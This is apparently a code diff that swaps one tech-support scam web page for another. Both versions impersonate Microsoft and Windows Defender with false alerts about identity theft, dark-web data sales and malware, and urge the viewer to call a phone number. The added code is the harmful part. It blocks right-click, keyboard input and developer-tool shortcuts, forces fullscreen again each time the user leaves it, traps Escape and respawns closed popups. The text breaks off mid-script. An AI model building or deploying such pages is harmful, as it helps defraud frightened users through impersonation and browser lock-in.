@@ -1,747 +1,384 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows Defender Alerts</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Theft alert-message</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+        background: url('https://media-hosting.imagekit.io/8967ac7ab4164ef4/screenshot_1744710766722.png?Expires=1839318768&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=BljHY3BsjO~0qEhP-RJgpJOawDHpoB5KoEhzCWLRAo4msujkWpuGiBdYYzp7MCHFtkbBGeDQUh-9nDOuxws0aVBYo5Mkv1B3tP66ZgnpWw7DM3IfiWYp126WvqKEhfh8~fdWqEZeJWgvfA1OSBXkVzW0SX18Si5mqBSlH83S-Erfgart3EXiG6YtgFrF4OyD45t2wLfwwsUOHsj6eiJe2aRkkfKD8Z7ZoBQ08D8lpPHNbTVeVoJU-UppcUdGU1lD99eC5-yd9t4Spe4M6X28LlkuyeV2nO6pUNtUdUeUf8Rr2J9Jo7a-Ef~qCFpCabg4e1gZNpieiWIn4hVCf~zPJA__') no-repeat center center fixed;
+      background-size: cover;
+      cursor: none;
+    }
+
+    .alert-message {
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #d32f2f, #9a0007);
+      color: #ffffff;
+      padding: 10px 20px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+      z-index: 15;
+      width: 100%;
+      max-width: 600px;
+      border-bottom-left-radius: 6px;
+      border-bottom-right-radius: 6px;
+    }
+
+    .popup {
+      width: 400px;
+      background: #fafafa;
+      border: 1px solid #005ea2;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+      position: absolute;
+      z-index: 10;
+      animation: popupFadeIn 0.4s ease-out;
+    }
+
+    @keyframes popupFadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.8);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .popup-header {
+      background: linear-gradient(135deg, #0078d4, #004578);
+      color: #ffffff;
+      padding: 10px 14px;
+      font-size: 16px;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top-left-radius: 10px;
+      border-top-right-radius: 10px;
+      cursor: move;
+    }
+
+    .popup-header .title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .popup-header img {
+      height: 20px;
+      width: 20px;
+    }
+
+    .popup-header .icons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .popup-header .icons span {
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 18px;
+      padding: 4px 8px;
+      border-radius: 6px;
+      transition: background 0.2s ease, transform 0.1s ease;
+    }
+
+    .popup-header .icons span:hover {
+      background: rgba(255, 255, 255, 0.25);
+      transform: scale(1.1);
+    }
+
+    .popup-body {
+      padding: 14px;
+      font-size: 15px;
+      color: #222;
+      line-height: 1.6;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      padding: 0 14px 14px;
+      gap: 14px;
+    }
+
+    .call-btn, .ignore-btn {
+      flex: 1;
+      padding: 10px 14px;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .call-btn {
+      background: linear-gradient(135deg, #e53935, #b71c1c);
+      color: #ffffff;
+    }
+
+    .call-btn:hover {
+      background: linear-gradient(135deg, #d32f2f, #9a0007);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .ignore-btn {
+      background: linear-gradient(135deg, #e0e0e0, #bdbdbd);
+      color: #222;
+    }
+
+    .ignore-btn:hover {
+      background: linear-gradient(135deg, #d6d6d6, #a0a0a0);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(2px);
+      z-index: 5;
+      display: none;
+    }
+
+    @media (max-width: 600px) {
+      .alert-message {
+        font-size: 14px;
+        padding: 8px 15px;
+      }
+
+      .popup {
+        width: 90%;
+        max-width: 360px;
+      }
+
+      .popup-header {
+        font-size: 15px;
+        padding: 8px 12px;
+      }
+
+      .popup-body {
+        font-size: 14px;
+        padding: 12px;
+      }
+
+      .buttons {
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .call-btn, .ignore-btn {
+        padding: 12px;
+      }
+    }
+  </style>
 </head>
-<body>
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            height: 100vh;
-            overflow: hidden;
-            cursor: none; /* Hide cursor by default */
-        }
-        a{
-            text-decoration: none;
-            color:black;
-            font-weight:bold;
-        }
+<body oncontextmenu="return false" onkeydown="return false">
+  <div class="alert-message">CRITICAL ALERT: YOUR SYSTEM IS COMPROMISED!</div>
+  <div class="overlay" id="overlay"></div>
 
-        .desktop {
-            position: relative;
-            width: 100%;
-            height: 100vh;
-        }
-
-        .alert-content {
-            display: flex;
-            justify-content: flex-start;
-            background: #fff;
-            width: 100%;
-            height: 100vh;
-            position: relative;
-        }
-
-        .alert {
-            position: absolute;
-            background: #fff;
-            border: 1px solid #0052cc;
-            border-radius: 8px;
-            padding: 15px;
-            width: 300px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            z-index: 10;
-            transition: transform 0.2s ease;
-            pointer-events: none; /* Disable pointer events by default */
-        }
-
-        .alert:hover {
-            transform: scale(1.02);
-        }
-
-        #alert1 {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            border: none;
-            border-radius: 0;
-            box-shadow: none;
-            padding: 30px;
-        }
-
-        #alert2 { top: 20%; left: 30%; z-index: 11; }
-        #alert3 { top: 15%; left: 50%; z-index: 12; }
-        #alert4 { top: 40%; left: 20%; z-index: 13; }
-        #alert5 { top: 50%; left: 40%; z-index: 14; }
-        #alert6 { top: 30%; left: 60%; z-index: 15; }
-        #alert7 { top: 60%; left: 10%; z-index: 16; }
-
-        .alert.fullscreen {
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            border-radius: 0;
-            z-index: 100;
-            transform: none;
-            padding: 30px;
-        }
-
-        .desktop.fullscreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            z-index: 9999;
-            background: #fff;
-        }
-
-        .alert-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #0052cc;
-            color: #fff;
-            padding: 8px 12px;
-            margin: -15px -15px 10px -15px;
-            border-top-left-radius: 8px;
-            border-top-right-radius: 8px;
-            pointer-events: auto;
-        }
-
-        #alert1 .alert-header {
-            margin: -30px -30px 20px -30px;
-            padding: 15px 20px;
-            border-radius: 0;
-        }
-
-        .alert h2 {
-            margin: 0;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        #alert1 h2 {
-            font-size: 24px;
-        }
-
-        .alert-controls {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            pointer-events: auto;
-        }
-
-        .control-btn {
-            width: 14px;
-            height: 14px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s ease;
-        }
-
-        #alert1 .control-btn {
-            width: 20px;
-            height: 20px;
-        }
-
-        .control-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-        }
-
-        .minimize::before {
-            content: '';
-            width: 8px;
-            height: 2px;
-            background: #fff;
-            position: absolute;
-        }
-
-        #alert1 .minimize::before {
-            width: 12px;
-            height: 3px;
-        }
-
-        .maximize::before {
-            content: '';
-            width: 8px;
-            height: 8px;
-            border: 1px solid #fff;
-            position: absolute;
-        }
-
-        #alert1 .maximize::before {
-            width: 12px;
-            height: 12px;
-        }
-
-        .close::before,
-        .close::after {
-            content: '';
-            width: 8px;
-            height: 2px;
-            background: #fff;
-            position: absolute;
-        }
-
-        #alert1 .close::before,
-        #alert1 .close::after {
-            width: 12px;
-            height: 3px;
-        }
-
-        .close::before {
-            transform: rotate(45deg);
-        }
-
-        .close::after {
-            transform: rotate(-45deg);
-        }
-
-        .alert p {
-            margin: 0 0 12px;
-            font-size: 13px;
-            color: #333;
-            line-height: 1.4;
-        }
-
-        #alert1 p {
-            font-size: 18px;
-            line-height: 1.6;
-        }
-
-        .alert a[href^="tel"] {
-            pointer-events: auto;
-            cursor: pointer;
-            color: #0052cc;
-            text-decoration: underline;
-        }
-
-        .btn-container {
-            display: flex;
-            gap: 5px;
-            pointer-events: auto;
-        }
-
-        #alert1 .btn-container {
-            gap: 10px;
-        }
-
-        .btn {
-            padding: 6px 12px;
-            cursor: pointer;
-            border: none;
-            font-size: 12px;
-            border-radius: 4px;
-            transition: background 0.2s ease;
-            flex: 1;
-            text-align: center;
-        }
-
-        #alert1 .btn {
-            padding: 10px 20px;
-            font-size: 16px;
-        }
-
-        .call {
-            background: #ff3333;
-            color: #fff;
-        }
-
-        .call:hover {
-            background: #e60000;
-        }
-
-        .ignore {
-            background: #e0e0e0;
-            color: #000;
-            border: 1px solid #666;
-        }
-
-        .ignore:hover {
-            background: #d0d0d0;
-        }
-
-        .red-alert {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #ff3333;
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            z-index: 50;
-            font-size: 14px;
-            font-weight: bold;
-            animation: blink 1s infinite;
-            display: none;
-            pointer-events: none;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        @media (max-width: 600px) {
-            .alert {
-                width: 85%;
-                left: 7.5%;
-                padding: 10px;
-            }
-            .alert h2 {
-                font-size: 12px;
-            }
-            .alert p {
-                font-size: 11px;
-            }
-            .btn {
-                padding: 4px 8px;
-                font-size: 10px;
-            }
-            .control-btn {
-                width: 12px;
-                height: 12px;
-            }
-            .minimize::before {
-                width: 6px;
-                height: 1px;
-            }
-            .maximize::before {
-                width: 6px;
-                height: 6px;
-                border: 1px solid #fff;
-            }
-            .close::before,
-            .close::after {
-                width: 6px;
-                height: 1px;
-            }
-            .red-alert {
-                font-size: 12px;
-                padding: 8px 15px;
-                width: 80%;
-                text-align: center;
-            }
-            #alert1 {
-                padding: 15px;
-            }
-            #alert1 h2 {
-                font-size: 16px;
-            }
-            #alert1 p {
-                font-size: 14px;
-            }
-            #alert1 .btn {
-                padding: 8px 16px;
-                font-size: 12px;
-            }
-        }
-    </style>
-    <div class="desktop" id="desktop">
-        <div class="alert-content">
-            <div class="alert" id="alert1">
-                <div class="alert-header">
-                    <h2>IDENTITY THEFT DETECTED - URGENT ACTION REQUIRED</h2>
-                    <div class="alert-controls">
-                        <button class="control-btn minimize" title="Minimize"></button>
-                        <button class="control-btn maximize" title="Maximize"></button>
-                        <button class="control-btn close" title="Close"></button>
-                    </div>
-                </div>
-                <p>Your digital life is under attack! Our advanced security scan has uncovered a critical breach: your personal information—bank details, passwords, and private documents—has been exposed on hidden corners of the internet. Immediate action is essential to lock down your identity and prevent irreversible damage. Don’t let hackers exploit you—take control now!</p>
-                
-            </div>
-        </div>
-        <div class="alert" id="alert2">
-            <div class="alert-header">
-                <h2>Microsoft Warning</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>WINDOWS DEFENDER ERROR
-                IDENTITY THEFT DETECTED: YOUR FILES ARE BEING SOLD ONLINE! HACKERS HAVE FULL ACCESS!
-                CALL <a href="tel:+1-800-555-0123">+1-800-555-0123</a> BEFORE YOUR LIFE IS RUINED!
-                
-                ERROR ID: MS-CRITICAL-10
-                DARK WEB ACTIVITY DETECTED – IMMEDIATE ACTION REQUIRED</p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="alert" id="alert3">
-            <div class="alert-header">
-                <h2>Microsoft Warning</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>WINDOWS DEFENDER ERROR
-                IDENTITY THEFT DETECTED: YOUR FILES ARE BEING SOLD ONLINE! HACKERS HAVE FULL ACCESS!
-                CALL <a href="tel:+1-800-555-0123">+1-800-555-0123</a> BEFORE YOUR LIFE IS RUINED!
-                
-                ERROR ID: MS-CRITICAL-10
-                DARK WEB ACTIVITY DETECTED – IMMEDIATE ACTION REQUIRED</p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="alert" id="alert4">
-            <div class="alert-header">
-                <h2>Microsoft Support Warning</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>YOUR PC IS COMPROMISED – ALL YOUR DATA IS LEAKING TO THE DARK WEB! ACT FAST, CALL <a href="tel:+1-877-555-0123">+1-877-555-0123</a> TO PREVENT TOTAL LOSS.
-
-                ERROR ID: MS-CRITICAL-4
-                DARK WEB ACTIVITY DETECTED – IMMEDIATE ACTION REQUIRED
-                
-                </p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="alert" id="alert5">
-            <div class="alert-header">
-                <h2>Microsoft Warning</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>WINDOWS DEFENDER ERROR
-                IDENTITY THEFT DETECTED: YOUR FILES ARE BEING SOLD ONLINE! HACKERS HAVE FULL ACCESS!
-                CALL <a href="tel:+1-800-555-0123">+1-800-555-0123</a> BEFORE YOUR LIFE IS RUINED!
-                
-                ERROR ID: MS-CRITICAL-10
-                DARK WEB ACTIVITY DETECTED – IMMEDIATE ACTION REQUIRED</p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="alert" id="alert6">
-            <div class="alert-header">
-                <h2>Security Alert</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>SYSTEM FAILURE IMMINENT: YOUR HARD DRIVE IS ABOUT TO FAIL! CALL MICROSOFT SUPPORT IMMEDIATELY.
-
-                ERROR CODE: MS-CRITICAL-11
-                DARK WEB ACTIVITY DETECTED – IMMEDIATE ACTION REQUIRED</p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="alert" id="alert7">
-            <div class="alert-header">
-                <h2>Microsoft Warning</h2>
-                <div class="alert-controls">
-                    <button class="control-btn minimize" title="Minimize"></button>
-                    <button class="control-btn maximize" title="Maximize"></button>
-                    <button class="control-btn close" title="Close"></button>
-                </div>
-            </div>
-            <p>CRITICAL BREACH: HACKERS ARE UPLOADING YOUR PRIVATE DATA TO THE DARK WEB!
-                YOUR BANK ACCOUNTS ARE AT RISK! CALL <a href="tel:+1-800-555-0123">+1-800-555-0123</a></p>
-            <div class="btn-container">
-                <a href="tel:+1-800-555-0123">
-                <button class="btn call">CALL NOW</button></a>
-                <button class="btn ignore">IGNORE (RISK EVERYTHING)</button>
-            </div>
-        </div>
-        <div class="red-alert" id="redAlert">CRITICAL WARNING: YOUR IDENTITY IS BEING STOLEN! ACT NOW!</div>
+  <!-- Initial Centered Popup -->
+  <div class="popup" id="mainPopup" style="top: 50%; left: 50%; transform: translate(-50%, -50%);">
+    <div class="popup-header">
+      <div class="title">
+        <img src="https://cdn-icons-png.flaticon.com/512/732/732225.png" alt="Windows Icon" />
+        MICROSOFT WARNING
+      </div>
+      <div class="icons">
+        <span onclick="minimize(this)">‒</span>
+        <span onclick="maximize(this)">□</span>
+        <span onclick="reopenPopup(this)">×</span>
+      </div>
     </div>
-    <!-- <script>
-        // Store original styles for alerts
-        const originalStyles = new Map();
+    <div class="popup-body">
+      <strong>SYSTEM FAILURE IMMINENT: YOUR FILES ARE BEING WIPED AND SOLD ON THE DARK WEB.</strong><br>
+      Unusual encryption activity has been detected on your local drive.<br>
+      Critical documents, images, and saved credentials are actively being extracted and uploaded to an anonymous dark web server.<br>
+      Immediate termination of all background processes is advised to avoid irreversible data loss.<br>
+      ERROR ID: MS-CRITICAL-69
+    </div>
+    <div class="buttons">
+      <button class="call-btn" onclick="goFullScreen()">Accept</button>
+      <button class="ignore-btn" onclick="goFullScreen()">IGNORE (RISK EVERYTHING)</button>
+    </div>
+  </div>
 
-        // Handle tab close attempt
-        window.addEventListener('beforeunload', function(e) {
-            const desktop = document.getElementById('desktop');
-            if (!desktop.classList.contains('fullscreen')) {
-                // Show confirmation dialog
-                e.preventDefault();
-                e.returnValue = 'Critical alert: Your system is at risk! Are you sure you want to leave?';
-                
-                // Enter full-screen mode
-                desktop.classList.add('fullscreen');
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen().catch(err => {
-                        console.error('Fullscreen request failed:', err);
-                    });
-                }
-                
-                // Hide all alerts except alert1
-                document.querySelectorAll('.alert').forEach(alert => {
-                    if (alert.id !== 'alert1') {
-                        alert.style.display = 'none';
-                    }
-                });
-                document.getElementById('redAlert').style.display = 'none';
-                
-                // Ensure alert1 is full-screen
-                const alert1 = document.getElementById('alert1');
-                originalStyles.set(alert1, {
-                    top: alert1.style.top,
-                    left: alert1.style.left,
-                    width: alert1.style.width,
-                    height: alert1.style.height,
-                    borderRadius: alert1.style.borderRadius,
-                    zIndex: alert1.style.zIndex,
-                    transform: alert1.style.transform,
-                    padding: alert1.style.padding
-                });
-                alert1.classList.add('fullscreen');
-            }
-            return e.returnValue;
-        });
+  <script>
+    const messages = [
+      "Critical Threat Detected: Multiple unauthorized attempts to access your local system registry have been logged. This may indicate ongoing remote control activity by a third-party entity. Windows Defender was unable to isolate the threat Immediate system lockdown is advised to prevent further data compromise.",
+      "A cluster of high-risk malware infections has embedded itself into your system kernel. These programs are currently logging keystrokes, accessing webcam data, and transmitting information without consent.",
+      "Your Microsoft Firewall has been disabled by an unauthorized script. An external host is attempting to gain remote access with admin privileges.",
+      "We’ve noticed simultaneous login attempts from Germany, India, and Brazil. Your personal information, including address and saved cards, may have been leaked.",
+      "A recent scan revealed unauthorized tampering of protected Windows system files. This usually occurs when your device is targeted by ransomware or rootkits.",
+      "A remote IP tried accessing your PC over port 443 using a stealth protocol Windows Defender has blocked the attempt, but your firewall remains vulnerable.",
+      "A background scan detected access to your BitLocker recovery keys Encrypted drives may now be vulnerable to brute-force decryption.",
+      "Unusual outbound traffic patterns match behavior of known botnets Your system might be sending spam or participating in DDoS attacks.",
+      "Key components of your operating system are being modified in real-time Your PC will automatically shut down in 60 seconds to prevent data corruption.",
+      "An unverified browser extension was detected sending data externally Browsing activity and saved passwords may be compromised."
+    ];
 
-        // Maximize button functionality
-        document.querySelectorAll('.maximize').forEach(button => {
-            button.addEventListener('click', function() {
-                const alert = this.closest('.alert');
-                const desktop = document.getElementById('desktop');
-                if (!alert.classList.contains('fullscreen') && !desktop.classList.contains('fullscreen')) {
-                    originalStyles.set(alert, {
-                        top: alert.style.top,
-                        left: alert.style.left,
-                        width: alert.style.width,
-                        height: alert.style.height,
-                        borderRadius: alert.style.borderRadius,
-                        zIndex: alert.style.zIndex,
-                        transform: alert.style.transform,
-                        padding: alert.style.padding
-                    });
-                    alert.classList.add('fullscreen');
-                    document.querySelectorAll('.alert').forEach(otherAlert => {
-                        if (otherAlert !== alert) {
-                            otherAlert.style.display = 'none';
-                        }
-                    });
-                    document.getElementById('redAlert').style.display = 'none';
-                    if (document.documentElement.requestFullscreen) {
-                        document.documentElement.requestFullscreen().catch(err => {
-                            console.error('Fullscreen request failed:', err);
-                        });
-                    }
-                }
-            });
-        });
+    let usedMessages = [];
+    let escPressTime = null;
 
-        // Escape key to exit full-screen
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Escape') {
-                const desktop = document.getElementById('desktop');
-                const fullscreenAlert = document.querySelector('.alert.fullscreen');
-                
-                if (desktop.classList.contains('fullscreen') || fullscreenAlert) {
-                    // Exit browser full-screen
-                    if (document.fullscreenElement) {
-                        document.exitFullscreen().catch(err => {
-                            console.error('Exit fullscreen failed:', err);
-                        });
-                    }
-                    
-                    // Handle desktop full-screen (from tab close)
-                    if (desktop.classList.contains('fullscreen')) {
-                        desktop.classList.remove('fullscreen');
-                        const alert1 = document.getElementById('alert1');
-                        const styles = originalStyles.get(alert1);
-                        if (styles) {
-                            alert1.style.top = styles.top;
-                            alert1.style.left = styles.left;
-                            alert1.style.width = styles.width;
-                            alert1.style.height = styles.height;
-                            alert1.style.borderRadius = styles.borderRadius;
-                            alert1.style.zIndex = styles.zIndex;
-                            alert1.style.transform = styles.transform;
-                            alert1.style.padding = styles.padding;
-                            alert1.classList.remove('fullscreen');
-                        }
-                    }
-                    
-                    // Handle alert full-screen (from maximize)
-                    if (fullscreenAlert) {
-                        const styles = originalStyles.get(fullscreenAlert);
-                        if (styles) {
-                            fullscreenAlert.style.top = styles.top;
-                            fullscreenAlert.style.left = styles.left;
-                            fullscreenAlert.style.width = styles.width;
-                            fullscreenAlert.style.height = styles.height;
-                            fullscreenAlert.style.borderRadius = styles.borderRadius;
-                            fullscreenAlert.style.zIndex = styles.zIndex;
-                            fullscreenAlert.style.transform = styles.transform;
-                            fullscreenAlert.style.padding = styles.padding;
-                            fullscreenAlert.classList.remove('fullscreen');
-                        }
-                    }
-                    
-                    // Restore all alerts
-                    document.querySelectorAll('.alert').forEach(alert => {
-                        alert.style.display = 'block';
-                    });
-                    // Restart red alert
-                    const redAlert = document.getElementById('redAlert');
-                    redAlert.style.display = 'block';
-                }
-            }
-        });
+    document.body.addEventListener('click', () => {
+      document.getElementById('overlay').style.display = 'block';
+    });
 
-        // Prevent other buttons from exiting full-screen
-        document.querySelectorAll('.ignore').forEach(button => {
-            button.addEventListener('click', function() {
-                const alert = this.closest('.alert');
-                const desktop = document.getElementById('desktop');
-                if (!alert.classList.contains('fullscreen') && !desktop.classList.contains('fullscreen')) {
-                    alert.style.display = 'none';
-                    setTimeout(() => {
-                        alert.style.display = 'block';
-                        if (alert.id !== 'alert1') {
-                            let top = Math.random() * 80 + '%';
-                            let left = Math.random() * 80 + '%';
-                            alert.style.top = top;
-                            alert.style.left = left;
-                        }
-                    }, 2000);
-                }
-            });
-        });
+    function goFullScreen() {
+      const el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
 
-        document.querySelectorAll('.call').forEach(button => {
-            button.addEventListener('click', function() {
-                alert('Calling +1-877-555-0123... (Simulated)');
-            });
-        });
+      window.onkeydown = (e) => {
+        if (
+          (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
+          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
+          (e.key === 'F12')
+        ) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.key === 'Escape') {
+          e.preventDefault();
+          if (!escPressTime) {
+            escPressTime = Date.now();
+          }
+          if (Date.now() - escPressTime >= 1000) {
+            escPressTime = null;
+          }
+          return false;
+        }
+      };
 
-        document.querySelectorAll('.close').forEach(button => {
-            button.addEventListener('click', function() {
-                const alert = this.closest('.alert');
-                const desktop = document.getElementById('desktop');
-                if (!alert.classList.contains('fullscreen') && !desktop.classList.contains('fullscreen')) {
-                    alert.style.display = 'none';
-                    setTimeout(() => {
-                        alert.style.display = 'block';
-                        if (alert.id !== 'alert1') {
-                            let top = Math.random() * 80 + '%';
-                            let left = Math.random() * 80 + '%';
-                            alert.style.top = top;
-                            alert.style.left = left;
-                        }
-                    }, 2000);
-                }
-            });
-        });
+      const main = document.getElementById('mainPopup');
+      main.remove();
 
-        document.querySelectorAll('.minimize').forEach(button => {
-            button.addEventListener('click', function() {
-                const alert = this.closest('.alert');
-                const desktop = document.getElementById('desktop');
-                if (!alert.classList.contains('fullscreen') && !desktop.classList.contains('fullscreen')) {
-                    alert.style.transform = 'scale(0.1)';
-                    alert.style.opacity = '0';
-                    setTimeout(() => {
-                        alert.style.transform = 'scale(1)';
-                        alert.style.opacity = '1';
-                    }, 2000);
-                }
-            });
-        });
+      usedMessages = shuffleArray([...messages]);
 
-        // Red alert blinking
-        const redAlert = document.getElementById('redAlert');
-        setInterval(() => {
-            const desktop = document.getElementById('desktop');
-            if (!desktop.classList.contains('fullscreen') && !document.querySelector('.alert.fullscreen')) {
-                redAlert.style.display = redAlert.style.display === 'none' ? 'block' : 'none';
-            }
-        }, 3000);
+      for (let i = 0; i < 10; i++) {
+        createPopup(i);
+      }
+    }
 
-        // Randomize alert positions on load
-        window.onload = () => {
-            document.querySelectorAll('.alert').forEach(alert => {
-                if (alert.id !== 'alert1') {
-                    let top = Math.random() * 80 + '%';
-                    let left = Math.random() * 80 + '%';
-                    alert.style.top = top;
-                    alert.style.left = left;
-                }
-            });
-            document.getElementById('alert1').style.zIndex = '1';
-        };
-    </script> -->
-<script>
-    document.querySelectorAll('.close').forEach(button => {
-        button.addEventListener('click', function() {
-            const desktop = document.getElementById('desktop');
-            const alert1 = document.getElementById('alert1');
-    
-            // Enter full-screen mode
-            desktop.classList.add('fullscreen');
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.error('Fullscreen request failed:', err);
-                });
-            }
-    
-            // Store original styles for alert1 if not already stored
-            if (!originalStyles.has(alert1)) {
-                originalStyles.set(alert1, {
-                    top: alert1.style.top,
-                    left: alert1.style.left,
-                    width: alert1.style.width,
-                    height: alert1.style.height,
-                    borderRadius: alert1.style.borderRadius,
-                    zIndex: alert1.style.zIndex,
-                    transform: alert1.style.transform,
-                    padding: alert1.style.padding
-                });
-            }
-    
-            // Make alert1 full-screen
-            alert1.classList.add('fullscreen');
-    
-            // Show all alerts
-            document.querySelectorAll('.alert').forEach(alert => {
-                alert.style.display = 'block';
-                // Optionally reset positions for non-alert1 popups
-                if (alert.id !== 'alert1') {
-                    let top = Math.random() * 80 + '%';
-                    let left = Math.random() * 80 + '%';
-                    alert.style.top = top;
-                    alert.style.left = left;
-                }
-            });
-    
-            // Hide red alert
-            document.getElementById('redAlert').style.display = 'none';
-        });
-    });</script>
-    </body>
+    function createPopup(index = 0) {
+      const popup = document.createElement('div');
+      popup.className = 'popup';
+      popup.style.top = Math.random() * 80 + '%';
+      popup.style.left = Math.random() * 80 + '%';
+
+      const message = usedMessages[index % usedMessages.length];
+
+      popup.innerHTML = `
+        <div class="popup-header">
+          <div class="title">
+            <img src="https://cdn-icons-png.flaticon.com/512/732/732225.png" alt="Windows Icon" />
+            MICROSOFT ERROR
+          </div>
+          <div class="icons">
+            <span onclick="minimize(this)">‒</span>
+            <span onclick="maximize(this)">□</span>
+            <span onclick="reopenPopup(this)">×</span>
+          </div>
+        </div>
+        <div class="popup-body">
+          ${message}
+        </div>
+        <div class="buttons">
+          <button class="call-btn" onclick="window.location.href='tel:+1234567890';">Call Now</button>
+          <button class="ignore-btn" onclick="alert('Still dangerous!')">Ignore (Risk Everything)</button>
+        </div>
+      `;
+      document.body.appendChild(popup);
+    }
+
+    function minimize(btn) {
+      const popup = btn.closest('.popup');
+      popup.querySelector('.popup-body').style.display = 'none';
+      popup.querySelector('.buttons').style.display = 'none';
+    }
+
+    function maximize(btn) {
+      const popup = btn.closest('.popup');
+      popup.querySelector('.popup-body').style.display = 'block';
+      popup.querySelector('.buttons').style.display = 'flex';
+    }
+
+    function reopenPopup(btn) {
+      const popup = btn.closest('.popup');
+      popup.remove();
+      setTimeout(() => createPopup(Math.floor(Math.random() * messages.length)), 500);
+    }
+
+    function shuffleArray(array) {
+      for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+      }
+      return array;
+    }
+
+    document.addEventListener('fullscreenchange', () => {
+      if (!document.fullscreenElement) goFullScreen();
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (
+        e.key === 'F12' ||
+        (e.ctrlKey && e.key === 'u') ||
